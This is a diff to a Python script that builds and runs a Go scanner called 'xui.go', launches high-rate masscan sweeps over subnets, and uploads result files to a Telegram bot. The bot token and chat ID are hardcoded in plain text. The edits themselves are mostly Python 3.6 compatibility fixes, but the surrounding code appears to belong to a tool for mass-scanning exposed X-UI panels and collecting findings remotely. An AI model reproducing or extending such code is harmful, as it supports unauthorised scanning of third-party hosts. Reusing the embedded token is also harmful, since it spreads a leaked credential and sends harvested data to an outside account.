@@ -1549,20 +1549,24 @@ def compile_go_program():
 
     try:
         # ==================== PYTHON 3.6 COMPATIBILITY FIX ====================
-        # Replaced capture_output=True with stdout/stderr pipes for Python 3.6 compatibility
-        result = subprocess.run(
+        # Replaced capture_output=True and text=True with pipes for Python 3.6 compatibility
+        process = subprocess.Popen(
             [GO_EXEC, 'build', '-o', executable_name, 'xui.go'],
             stdout=subprocess.PIPE,
             stderr=subprocess.PIPE,
-            text=True,
-            check=True,
-            encoding='utf-8',
             env=go_env
         )
+        stdout, stderr = process.communicate()
+        stdout = stdout.decode('utf-8', errors='ignore')
+        stderr = stderr.decode('utf-8', errors='ignore')
+
+        if process.returncode != 0:
+            raise subprocess.CalledProcessError(process.returncode, [GO_EXEC, 'build', '-o', executable_name, 'xui.go'], stdout, stderr)
         # ======================================================================
-        if result.stderr:
+        
+        if stderr:
             print("--- Go编译器警告 ---")
-            print(result.stderr)
+            print(stderr)
         print(f"--- Go程序编译成功: {executable_name} ---")
         return executable_name
     except subprocess.CalledProcessError as e:
@@ -1708,21 +1712,17 @@ def run_xui_for_parts(sleep_seconds, executable_name, total_ips):
             cmd.append('./' + executable_name)
             cmd.append(str(mem_limit)) # Pass mem_limit as argument
 
-            # **MEMORY LEAK FIX**: Redirect stderr to stdout to ensure the buffer is always read.
             process = subprocess.Popen(
                 cmd,
                 stdout=subprocess.PIPE,
                 stderr=subprocess.STDOUT,
-                text=True,
-                encoding='utf-8',
-                errors='ignore', # Ignore potential decoding errors from binary output
                 env=run_env
             )
             
-            # Read from the combined output stream
-            for line in iter(process.stdout.readline, ''):
-                if not line.strip().startswith('\r'):
-                    sys.stdout.write(line)
+            for line in iter(lambda: process.stdout.readline(), b''):
+                line_str = line.decode('utf-8', errors='ignore')
+                if not line_str.strip().startswith('\r'):
+                    sys.stdout.write(line_str)
                     sys.stdout.flush()
 
             process.wait()
@@ -2148,9 +2148,7 @@ def analyze_and_expand_scan(result_file, template_mode, params, template_map):
                 try:
                     if os.path.exists(masscan_output_file): os.remove(masscan_output_file)
                     masscan_cmd = ["masscan", subnet, "-p", port, "--rate=10000", "-oG", masscan_output_file]
-                    # ==================== PYTHON 3.6 COMPATIBILITY FIX ====================
-                    subprocess.run(masscan_cmd, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
-                    # ======================================================================
+                    subprocess.run(masscan_cmd, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
                     with open(masscan_output_file, 'r') as f:
                         for line in f:
@@ -2183,9 +2181,7 @@ def analyze_and_expand_scan(result_file, template_mode, params, template_map):
                 run_env["GOMEMLIMIT"] = f"{psutil.virtual_memory().total * 0.7 // 1024 // 1024}MiB"
                 run_env["GOGC"] = "50"
                 cmd = ['./' + executable_name]
-                # ==================== PYTHON 3.6 COMPATIBILITY FIX ====================
-                subprocess.run(cmd, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, env=run_env)
-                # ======================================================================
+                subprocess.run(cmd, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, env=run_env)
                 
                 if os.path.exists('xui.txt'):
                     with open('xui.txt', 'r') as f:
@@ -2403,10 +2399,7 @@ if __name__ == "__main__":
                 BOT_TOKEN = "7664203362:AAFTBPQ8Ydl9c1fqM53CSzKIPS0VBj99r0M"
                 CHAT_ID = "7697235358"
 
-                # ==================== TYPO FIX ====================
-                # Corrected CH_ID to CHAT_ID
                 if BOT_TOKEN and CHAT_ID:
-                # ================================================
                     files_to_send = []
                     if final_result_file and os.path.exists(final_result_file):
                         files_to_send.append(final_result_file)
